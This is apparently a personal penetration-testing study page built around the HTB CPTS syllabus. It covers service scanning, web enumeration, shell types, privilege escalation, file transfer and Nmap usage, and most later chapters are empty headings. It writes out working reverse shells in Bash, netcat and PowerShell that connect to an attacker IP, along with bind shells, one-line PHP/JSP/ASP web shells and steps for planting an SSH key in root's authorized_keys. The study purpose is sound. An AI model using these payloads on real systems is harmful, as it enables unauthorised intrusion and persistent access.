---
title: 'Penetration Testing'
category: 'Offensive Cybersecurity'
---


<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Knowledge</div>
<h1 class="writeup-title"><strong>Penetration Testing</strong></h1>
General pentesting knowledge base built on Hack The Box's <a href="https://academy.hackthebox.com/preview/certifications/htb-certified-penetration-testing-specialist" target="_blank" rel="noopener noreferrer">CPTS</a> as the core syllabus, with unique techniques and information from TCM Security's <a href="https://certifications.tcm-sec.com/pnpt/" target="_blank" rel="noopener noreferrer">PNPT</a>, Altered Security's <a href="https://www.alteredsecurity.com/acpt" target="_blank" rel="noopener noreferrer">ACPT</a> and OffSec's <a href="https://www.offsec.com/courses/pen-200/" target="_blank" rel="noopener noreferrer">OSCP</a> layered in.
</div>
</div>

<br />


## 1. Getting Started {#ch1-getting-started}

### 1.1 Staying Organised {#ch1.1-staying-organised}

<h4 class="mb-2"><strong>&gt; Folder Structure</strong></h4>

- A clear folder structure contains scoping information, enumeration data, evidence of exploitation attempts, sensitive data such as credentials, and other data obtained during recon, exploitation, and post-exploitation.

```
Projects/
└── Acme Company
    ├── External Penetration Test
    │   ├── evidence
    │   │   ├── credentials
    │   │   ├── data
    │   │   └── screenshots
    │   ├── logs
    │   ├── scans
    │   ├── scope
    │   └── tools
    └── Internal Penetration Test
        ├── evidence
        │   ├── credentials
        │   ├── data
        │   └── screenshots
        ├── logs
        ├── scans
        ├── scope
        └── tools
```

### 1.2 Service Scanning {#ch1.2-service-scanning}
- Port numbers range from 1 to 65535. Well-known ports (1 to 1023) are reserved for privileged services. Port 0 is a reserved port in TCP/IP networking, and is not used in TCP or UDP messages. Anything that attempts to bind to port 0, will end up being bounded to next available port above 1024, because port 0 is a 'wild card' port.

#### Nmap
- Running Nmap scan without any options will by default only scan the 1000 most common ports.
- Nmap conducts TCP scan unless specifically requested to perform UDP scan.
- Ports with `filtered` state means firewall allows access to the ports from specific addresses.

#### Banner Grabbing
- A service will often identify itself by displaying a banner once a connection is initiated.
- Nmap will attempt banner grabbing if the syntax `nmap -sV --script=banner [Target_IP]` is specified.
- Netcat can also be used: `nc -nv [Target_IP]`
- Process can be automated by using Nmap's scripting engine: `nmap -sV --script=banner -p21 10.10.10.0/24`

#### FTP
- Often contains interesting data.
- Check if anonymous authentication is enabled.

#### SMB
- Exists on Windows machines and provides many vectors for vertical and lateral movement.
- Sensitive data, including credentials, can be in network file shares, and some SMB versions may be vulnerable to RCE exploits such as EternalBlue.
- Nmap has scripts for SMB enumeration, such as `smb-os-discovery.nse`, which will interact with the SMB service to extract the reported OS version.

#### Shares
- SMB allows users and administrators to share folders and make them accessible remotely by other users.
- These shares have files in them that contain sensitive information such as passwords.
- Use `smbclient` to enumerate and interact with SMB shares. `-L` flag specifies we want to list available shares on the remote host, while `-N` suppresses the password prompt. Syntax: `smbclient -N -L \\\\[Target_IP]`

#### SNMP
- SNMP Community strings provide information and statistics about a router or device, helping us gain access to it.
- The manufacturer default community strings of `public` and `private` are often unchanged.
- In SNMP v1 & 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. 
- Encryption and authentication were only added in SNMP v3.
- Examination of process parameters might reveal credentials passed on the command line, which might be reusable for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.

```Bash
aaronamran@htb[/htb]$ snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0

iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"


aaronamran@htb[/htb]$ snmpwalk -v 2c -c private  10.129.42.253 

Timeout: No Response from 10.129.42.253
```

- Tools such as `onesixtyone` can be used to brute force the community string names using a dictionary file such as `dict.txt`. Syntax: `onesixtyone -c dict.txt [Target_IP]`


### 1.3 Web Enumeration {#ch1.3-web-enumeration}

#### Gobuster
- Directory/File Enumeration: `gobuster dir -u http://[Target_IP]/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
- DNS Subdomain Enumeration (requires adding a DNS Server such as 1.1.1.1 into `/etc/resolv.conf`): `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`

#### Web Enumeration Tips
- Banner Grabbing / Web Server Headers: use `curl` to retrieve server header information via CLI.
- Whatweb: `whatweb [Target_IP]`
- Certificates: SSL/TLS certs are potentially valuable source of information if HTTPS is used. Browsing to `https://[Target_IP]` and viewing the certificate might reveal details such as email address and company name. This is useful for conducting phishing attacks.
- Robots.txt: Reveals disallowed entries for search engine web crawlers.
- Source Code: `Ctrl+U` might contain helpful comments or hardcoded credentials.

### 1.4 Public Exploits {#ch1.4-public-exploits}
- Finding Public Exploits: Googling target with exploit, SearchSploit (`searchsploit`), Exploit DB, Rapid7 DB, Vulnerability Lab.
- Metasploit Primer: Syntax example: `msfconsole -q` > `search exploit eternalblue` > `use exploit/windows/smb/ms17_010_psexec`

### 1.5 Types of Shells {#ch1.5-types-of-shells}

<table class="default-table">
  <thead>
    <tr>
      <th>Type of Shell</th>
      <th>Method of Communication</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>Reverse Shell</code></td>
      <td>Connects back to our system and gives us control through a reverse connection. A dropped connection means rerunning the exploit.</td>
    </tr>
    <tr>
      <td><code>Bind Shell</code></td>
      <td>Waits for us to connect to it and gives us control once we do. If our bind shell session drops but the bind shell session process is still running on the target, we can just <code>nc [Target_IP] [Port_No.]</code> again.</td>
    </tr>
    <tr>
      <td><code>Web Shell</code></td>
      <td>Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.</td>
    </tr>
  </tbody>
</table>

#### Reverse Shell
- Use `netcat` listener: `nc -lvnp 1234`

<table class="default-table">
  <thead>
    <tr>
      <th>Flag</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>-l</code></td>
      <td>Listen mode, to wait for a connection to connect to us.</td>
    </tr>
    <tr>
      <td><code>-v</code></td>
      <td>Verbose mode, so that we know when we receive a connection.</td>
    </tr>
    <tr>
      <td><code>-n</code></td>
      <td>Disable DNS resolution and only connect from/to IPs, to speed up the connection.</td>
    </tr>
    <tr>
      <td><code>-p 1234</code></td>
      <td>Port number <code>netcat</code> is listening on, and the reverse connection should be sent to.</td>
    </tr>
  </tbody>
</table>

- Online reverse shell reference: <a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/" target="_blank" rel="noopener noreferrer">Payload All The Things</a> and <a href="https://www.revshells.com/" target="_blank" rel="noopener noreferrer">Online Reverse Shell Generator</a>
- Bash reverse shell examples:

```Bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

- PowerShell reverse shell example:

```PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

#### Bind Shell
- Unlike reverse shell that connects to us, we will have to connect to it on the targets' listening port.
- Once we execute a bind shell command, it will start listening on a port on the remote host and bind that host's shell (Bash or PowerShell) to that port. We have to connect to that port with `netcat`, and we will get control through a shell on the system.
- `0.0.0.0` means "listen on all interfaces". The target host has multiple interfaces (eth0, lo, etc.); binding to `0.0.0.0` ensures our connection is accepted regardless of which interface we reach it through.
- `0.0.0.0` is used in bind shell so the attacker can connect from anywhere. If we bind to a specific IP (e.g. `192.168.1.50`) and approach it from a different interface, the connection would be refused even if the port is open.
- Context-dependent: `0.0.0.0` is the default safe choice for CTF/pentest; in real engagements we may bind to a specific interface for stealth or to restrict who can connect.
- Bash bind shell example:

```Bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

- Python bind shell example:
```Python
python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

- PowerShell bind shell example:
```PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

#### Upgrading TTY (Teletypewriter)
- Once we connect to a shell via Netcat, we do not have full terminal controls. We need to upgrade our TTY by mapping our terminal TTY with the remote TTY.
- The `python/stty` method: In the `netcat` shell, run the following to use Python to upgrade shell type to a full TTY:
```Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- After we run this command, we will hit `Ctrl+Z` to background our shell and get back on our local terminal, and input the following `stty` command:
```Console
www-data@remotehost$ ^Z

[1] Stopped                 nc -lvnp 1234
aaronamran@htb[/htb]$ stty raw -echo
aaronamran@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```
- Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `Enter` again to get back to our shell or input `reset` and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.

<table class="default-table">
  <thead>
    <tr>
      <th>Scenario</th>
      <th>Without stty</th>
      <th>With stty</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Running a long scan, want to cancel</td>
      <td><code>Ctrl+C</code> = dead shell</td>
      <td>Works normally</td>
    </tr>
    <tr>
      <td>Privilege escalation via <code>su</code></td>
      <td>Password echoes on screen</td>
      <td>Hidden</td>
    </tr>
    <tr>
      <td>Using <code>vim</code> to edit a file</td>
      <td>Garbled/broken display</td>
      <td>Works</td>
    </tr>
    <tr>
      <td>Navigating command history</td>
      <td>Broken</td>
      <td>Arrow keys work</td>
    </tr>
  </tbody>
</table>

#### Web Shell
- A web shell is typically a web script (PHP, JSP, ASPX) that accepts our command through HTTP Request parameters such as `GET` or `POST`, executes our command, and prints the output back on the web page.
- Short PHP web shell:
```PHP
<?php system($_REQUEST["cmd"]); ?>
```

- Short JSP web shell:
```Java
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

- Short ASP web shell:
```ASP
<% eval request("cmd") %>
```

<table class="default-table">
  <thead>
    <tr>
      <th>Web Server</th>
      <th>Default Webroot</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Apache</td>
      <td><code>/var/www/html/</code></td>
    </tr>
    <tr>
      <td>Nginx</td>
      <td><code>/usr/local/nginx/html/</code></td>
    </tr>
    <tr>
      <td>IIS</td>
      <td><code>c:\inetpub\wwwroot\</code></td>
    </tr>
    <tr>
      <td>XAMPP</td>
      <td><code>C:\xampp\htdocs\</code></td>
    </tr>
  </tbody>
</table>

### 1.6 Privilege Escalation {#ch1.6-privilege-escalation}

#### PrivEsc Checklists
- <a href="https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html" target="_blank" rel="noopener noreferrer">HackTricks Linux PrivEsc Checklist</a>
- <a href="https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html" target="_blank" rel="noopener noreferrer">HackTricks Windows PrivEsc Checklist</a>
- <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Linux PrivEsc Checklist</a>
- <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings Windows PrivEsc Checklist</a>

#### Enumeration Scripts
- Common Linux enumeration scripts: <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener noreferrer">LinEnum</a>, <a href="https://github.com/sleventyeleven/linuxprivchecker" target="_blank" rel="noopener noreferrer">linuxprivchecker</a>
- Common Windows enumeration scripts: <a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noopener noreferrer">Seatbelt</a>, <a href="https://github.com/411Hall/JAWS" target="_blank" rel="noopener noreferrer">JAWS</a>
- Both Linux and Windows Server enumeration script: <a href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener noreferrer">PEASS-ng</a>
- Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of noise that may trigger anti-virus software or security monitoring software. This may prevent scripts from running or trigger an alarm that the system has been compromised. We may need to manually enumerate instead.

#### Possible Vulnerabilities
- Kernel Exploits: Unpatched servers may be vulnerable, for example Linux version `3.9.0-73-generic` is vulnerable to <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="noopener noreferrer">CVE-2016-5195 aka DirtyCow</a>
- Vulnerable Software: In Linux, run `dpkg -l`. In Windows, look inside `C:\Program Files`
- User Privileges: 
  - Common ways to exploit user privileges: Sudo (Check current user `sudo` privileges with `sudo -l`), SUID, and Windows Token Privileges. 
  - Refer to <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins for Linux</a> and <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS for Windows</a>
- Scheduled Tasks: 
  - Two usual ways to take advantage of Windows scheduled tasks or Linux cron jobs: Add new schedules tasks/cron jobs or trick them to execute malicious software. 
  - In Linux, if we can write to a directories called by cron job such as `/etc/crontab`, `/etc/cron.d` or `/var/spool/cron/crontabs/root`, we could write a bash script with reverse shell commands.
- Exposed Credentials: 
  - Look for configuration files, log files and user history files (`bash_history` in Linux and `PSReadLine` in Windows). 
  - Reading `/var/www/html/config.php` contains database password which allows us to log in to local `mysql` databases and look for interesting information. 
  - We should also check for Password Reuse, which may allow us to switch to that user.
- SSH Keys: 
  - If we have read access to `.ssh` directory for a specific user, we may read their private SSH keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. 
  - If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our attacker machine and use the `-i` flag to log in with it (`ssh root@[Target_IP] -i id_rsa`). 
  - We need to use the command `chmod 600 id_rsa` on the key to change the file's permissions to be more restrictive. If SSH keys have lax permissions, the server would prevent them from working. 
  - If we find ourselves with write access to a users `/.ssh` directory, we can place our public key in the user's SSH directory at `/home/user/.ssh/authorized_keys`. This is to gain SSH access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. 
  - We must first create a new key using `ssh-keygen -f key`. This will give us 2 files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the victim machine. After copying `key.pub` to the victim machine, we add it into `/root/.ssh/authorized_keys` by using `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`. Now the victim machine should allow us to log in as that user using our private key (`ssh root@[Target_IP] -i key`).

### 1.7 Transferring Files {#ch1.7-transferring-files}
#### Using wget
- Requires running Python server (`python3 -m http.server 8000`)
- `wget http://[Attacker_IP]:8000/linenum.sh`
- If victim machine does not have `wget`, we can use `curl http://[Attacker_IP]:8000/linenum.sh -o linenum.sh`

#### Using SCP
- If we have SSH user credentials, we can use `scp linenum.sh user@victim_machine:/tmp/linenum.sh`

#### Using Base64
- If victim machine has firewall protections that prevents downloading files from our attacker machine, we can Base64 encode the file, paste the Base64 string on the victim machine and decode it.
- For example, if we want to transfer a binary file called `shell`, we can encode it:
```Console
aaronamran@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```
- Now we copy the Base64 string, and in the victim machine, use `base64 -d` to decode it and pipe the output into a file:
```Console
user@victim_machine$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

#### Validating File Transfers
- Compare `md5sum` of file on attacker machine and victim machine. Both should be the same. Syntax: `md5sum [file_name]`



## 2. Network Enumeration with Nmap {#ch2-network-enumeration-with-nmap}

### 2.1 Scan Techniques {#ch2.1-scan-techniques}
- Scanning techniques Nmap offers:
```Console
aaronamran@htb[/htb]$ nmap --help

<SNIP>
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
<SNIP>
```
- The TCP-SYN scan (`-sS`) is one of the default settings unless we have defined otherwise and is also one of the most popular scan methods.
- Allows us to scan several thousand ports per second.
- TCP-SYN scan sends one packet with the SYN flag and never completes the three-way handshake, which results in not establishing a full TCP connection to the scanned port.
- If our target sends a `SYN-ACK` flagged packet back to us, Nmap detects the port is `open`.
- If the target responds with an `RST` flagged packet, the port is `closed`.
- If Nmap does not receive a packet back, it will display it as `filtered`. Depending on the firewall configuration, certain packets may be dropped or ignored.

### 2.2 Host Discovery {#ch2.2-host-discovery}
- The most effective Nmap host discovery method is the ICMP echo requests.

#### Scan Network Range
- Scanning the network range (only if the firewalls of the hosts allow it):
```Console
aaronamran@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5

10.129.2.4
10.129.2.10
10.129.2.11
10.129.2.18
10.129.2.19
10.129.2.20
10.129.2.28
```

<table class="default-table">
  <thead>
    <tr>
      <th>Scanning Options</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>10.129.2.0/24</code></td>
      <td>Target network range.</td>
    </tr>
    <tr>
      <td><code>-sn</code></td>
      <td>Disables port scanning.</td>
    </tr>
    <tr>
      <td><code>-oA tnet</code></td>
      <td>Stores the results in all formats starting with the name 'tnet'.</td>
    </tr>
  </tbody>
</table>

#### Scan IP List
- During an internal penetration test, we could be provided with an IP list of the target hosts. Nmap allows us to work with the lists.
- Given a list file named `hosts.lst`, if we use the same scanning technique, it will look like this:
```Console
aaronamran@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5

10.129.2.18
10.129.2.19
10.129.2.20
```

<table class="default-table">
  <thead>
    <tr>
      <th>Scanning Options</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>-sn</code></td>
      <td>Disables port scanning.</td>
    </tr>
    <tr>
      <td><code>-oA tnet</code></td>
      <td>Stores the results in all formats starting with the name 'tnet'.</td>
    </tr>
    <tr>
      <td><code>-iL</code></td>
      <td>Performs defined scans against targets in provided 'hosts.lst' list.</td>
    </tr>
  </tbody>
</table>

- Note that hosts which are not listed as active in the output may mean they ignore the default ICMP echo requests due to their firewall configurations.

#### Scan Multiple IPs
- We can specify multiple IP addresses for scanning.
```Console
aaronamran@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d" " -f5

10.129.2.18
10.129.2.19
10.129.2.20
```
- If the IP addresses are next to each other, we can define the range in the respective octet.
```Console
aaronamran@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d" " -f5

10.129.2.18
10.129.2.19
10.129.2.20
```

#### Scan Single IP
- If we disable port scan (`-sn`), Nmap automatically ping scan with `ICMP Echo Requests` (`-PE`). Once such a request is sent, we expect an `ICMP reply` if the pinging host is alive.
- Before Nmap could send an ICMP echo request, it would send an `ARP ping` resulting in an `ARP reply`. We can confirm this with the "`--packet-trace`" option to show all packets sent and received. To ensure that ICMP echo requests are sent, we also define the option (`-PE`).
```Console
aaronamran@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace 

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST
SENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2
RCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF
Nmap scan report for 10.129.2.18
Host is up (0.023s latency).
MAC Address: DE:AD:00:00:BE:EF
Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```
- A way to determine why Nmap has marked our target as "alive" is with the `--reason` option, which displays the reson for specific result.
- To disable ARP requests and scan our target with the desired `ICMP echo requests`, we can disable ARP pings by setting the "`--disable-arp-ping`" option.

### 2.3 Host and Port Scanning {#ch2.3-host-and-port-scanning}
6 different states for a scanned port:
- open: connection to the scanned port has been established (connections can be TCP connections, UDP datagrams, or SCTP associations)
- closed: TCP protocol indicates the packet we received back contains an `RST` flag. This scanning method can be used to determine if our target is alive or not.
- filtered: Nmap cannot correctly identify port is open or closed because no response returned or error code was received.
- unfiltered: Only occurs during TCP-ACK scan and means port is accessible, but unsure if open or closed.
- open|filtered: State occurs when response is not received for a specific port. Either firewall or packet filter protects the port.
- closed|filtered: Only occurs in IP ID idle scans and indicates that it was impossible to determine if scanned port is closed or filtered by firewall.

#### Discovering Open TCP Ports
- By default, Nmap scans the top 1000 TCP ports with the SYN scan (`-sS`) when we run it as root because of the socket permissions required to create raw TCP packets.
- Otherwise, the TCP scan (`-sT`) is performed by default.
- Ports can be defined one by one (`-p 22,25,80`), by range (`-p 22-445`), by top ports (`--top-ports=10`) from the Nmap database that has been signed as most frequent, by scanning all ports (`-p-`), or by fast port scan containing top 100 ports (`-F`).
- Adding `--packet-trace` shows all packets sent and received in the output.
- Nmap TCP Connect Scan (`-sT`) uses the TCP three-way handshake (complete, accurate, map network without causing service dirsuption because it behaves like a normal client connection, not stealthy as it fully establishes a connection which is logged and easily detected by modern solutions) to determine if a specific port on a target host is open or closed. The scan sends a `SYN` packet to the target port and waits for a response. It is considered open if `SYN-ACK` packet is received, and closed if `RST` packet is received.
- SYN scan (aka half-open scan) is stealthy because full handshake is not completed, which minimises chance of triggering connection logs while still gathering port state information. 
- When a packet gets dropped, Nmap receives no response, and by default, the retry rate (`--max-retries`) is set to `10`. If a port is shown as filtered, we can track how our sent packets are handled by deactivating the ICMP echo requests (`-Pn`), DNS resolution (`-n`) and ARP ping scan (`--disable-arp-ping`).

#### Discovering Open UDP Ports
- UDP is a stateless protocol, and does not require a three-way handshake like TCP (disadvantage: we do not receive any acknowledgement).
- The timeout is much longer, making the whole UDP scan (`-sU`) much slower than the TCP scan (`-sS`).
- Receiving no response from target means if the UDP port is open, we only get a response if the application is configured to do so.
- Getting an ICMP response with `error code 3` (requires `--packet-trace`) means port is unreachable and closed.
- Use `-sV` option to identify versions, service names, and details about target.


### 2.4 Saving the Results {#ch2.4-saving-the-results}
- Nmap saves results in 3 different formats: 
  - Normal output (`-oN`): `.nmap`
  - Grepable output (`-oG`): `.gnmap`
  - XML output (`-oX`): `.xml`
- We need to specify the name of the file that stores our outputs.
- We can specify the option `-oA` to save the results in all formats. If no full path is given, the results will be stored in the directory we are currently in. 
- With the XML output, we can easily create HTML reports that are easy to read by converting XML to HTML using `xsltproc`.


### 2.5 Service Enumeration {#ch2.5-service-enumeration}
- It is recommended to perform a quck port scan first, to view available ports. This causes less traffic, which is advantageous because we might be discovered and blocked by security mechanisms.

#### Service Version Detection
- Use `-sV` to perform service version detection against specified ports.
- Pressing our keyboard's space bar during the scan will cause Nmap to show us the scan status.
- We can use the option `--stats-every=5s` to define the periods of time the status should be shown. We can specify number of seconds (`s`) or minutes (`m`).
- We can also increase the verbosity level using `-v` or `-vv`.

#### Banner Grabbing
- Nmap looks at the banners of scanned ports and print them out.
- If it cannot identify versions through the banners, Nmap attempts to identify them through a signature-based matching system, but this significantly increases the scan's duration.
- One disadvantage to Nmap's results is that the automatic scan can miss some information because sometimes Nmap does not know how to handle it.


### 2.6 Nmap Scripting Engine {#ch2.6-nmap-scripting-engine}

<table class="default-table">
  <thead>
    <tr>
      <th>Category</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>auth</td>
      <td>Determination of authentication credentials.</td>
    </tr>
    <tr>
      <td>broadcast</td>
      <td>Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.</td>
    </tr>
    <tr>
      <td>brute</td>
      <td>Executes scripts that try to log in to the respective service by brute-forcing with credentials.</td>
    </tr>
    <tr>
      <td>default</td>
      <td>Default scripts executed by using the <code>-sC</code> option.</td>
    </tr>
    <tr>
      <td>discovery</td>
      <td>Evaluation of accessible services.</td>
    </tr>
    <tr>
      <td>dos</td>
      <td>These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.</td>
    </tr>
    <tr>
      <td>exploit</td>
      <td>This category of scripts tries to exploit known vulnerabilities for the scanned port.</td>
    </tr>
    <tr>
      <td>external</td>
      <td>Scripts that use external services for further processing.</td>
    </tr>
    <tr>
      <td>fuzzer</td>
      <td>This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.</td>
    </tr>
    <tr>
      <td>intrusive</td>
      <td>Intrusive scripts that could negatively affect the target system.</td>
    </tr>
    <tr>
      <td>malware</td>
      <td>Checks if some malware infects the target system.</td>
    </tr>
    <tr>
      <td>safe</td>
      <td>Defensive scripts that do not perform intrusive and destructive access.</td>
    </tr>
    <tr>
      <td>version</td>
      <td>Extension for service detection.</td>
    </tr>
    <tr>
      <td>vuln</td>
      <td>Identification of specific vulnerabilities.</td>
    </tr>
  </tbody>
</table>

- Use `-sC` to use Nmap default scripts.
- To specify script category, run `--script <category>`. To specify defined scripts, run `--script <script-name>`.
- Using the aggressive option (`-A`) in Nmap will scan the target with multiple options: service detection (`-sV`), OS detection (`-O`), traceroute (`--traceroute`) and with default NSE scripts (`-sC`).
- Use `--script vuln` for vulnerability assessment via Nmap.


### 2.7 Performance {#ch2.7-performance}





## 3. Footprinting {#ch3-footprinting}


## 4. Information Gathering - Web Edition {#ch4-information-gathering-web-edition}


## 5. Vulnerability Assessment {#ch5-vulnerability-assessment}


## 6. File Transfers {#ch6-file-transfers}


## 7. Shells & Payloads {#ch7-shells-and-payloads}


## 8. Using the Metasploit Framework {#ch8-using-the-metasploit-framework}


## 9. Password Attacks {#ch9-password-attacks}


## 10. Attacking Common Services {#ch10-attacking-common-services}


## 11. Pivoting, Tunneling, and Port Forwarding {#ch11-pivoting-tunneling-and-port-forwarding}


## 12. Active Directory Enumeration & Attacks {#ch12-active-directory-enumeration-and-attacks}


## 13. Using Web Proxies {#ch13-using-web-proxies}


## 14. Attacking Web Applications with Ffuf {#ch14-attacking-web-applications-with-ffuf}

## 15. Login Brute Forcing {#ch15-login-brute-forcing}


## 16. SQL Injection Fundamentals {#ch16-sql-injection-fundamentals}


## 17. SQLMap Essentials {#ch17-sqlmap-essentials}



## 18. Cross-Site Scripting (XSS) {#ch18-cross-site-scripting-xss}


## 19. File Inclusion {#ch19-file-inclusion}


## 20. File Upload Attacks {#ch20-file-upload-attacks}


## 21. Command Injections {#ch21-command-injections}


## 22. Web Attacks {#ch22-web-attacks}


## 23. Attacking Common Applications {#ch23-attacking-common-applications}


## 24. Linux Privilege Escalation {#ch24-linux-privilege-escalation}


## 25. Windows Privilege Escalation {#ch25-windows-privilege-escalation}


## 26. Documentation & Reporting {#ch26-documentation-and-reporting}


## 27. Attacking Enterprise Networks {#ch27-attacking-enterprise-networks}








<table class="default-table">


<br />


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hack.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">August 2026</p>
</section>
<br />
<div class="writeup-nav">
</div>

</div>


